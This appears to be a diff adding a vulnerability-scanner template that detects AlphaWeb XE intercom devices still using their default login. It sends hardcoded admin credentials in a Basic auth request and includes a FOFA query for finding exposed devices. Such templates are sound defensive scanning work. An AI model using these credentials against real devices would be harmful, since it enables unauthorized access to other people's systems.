@@ -1,0 +1,29 @@
+id: alphaweb-default-login
+
+info:
+  name: AlphaWeb XE Default Login
+  author: Lark Lab
+  severity: high
+  verified: true
+  description: |
+    An AlphaWeb XE default login was discovered.
+    FOFA: alphaweb 
+  reference:
+    - https://wiki.zenitel.com/wiki/AlphaWeb
+  tags: default-login,AlphaWeb
+  created: 2023/06/24
+
+set:
+  admin: base64("admin:alphaadmin")
+rules:
+  r0:
+    request:
+      method: GET
+      path: /php/node_info.php
+      headers:
+        Authorization: Basic {{admin}}
+    expression: |
+      response.status == 200 &&
+      response.body.bcontains(b'HW Configuration') &&
+      response.body.bcontains(b'SW Configuration')
+expression: r0()
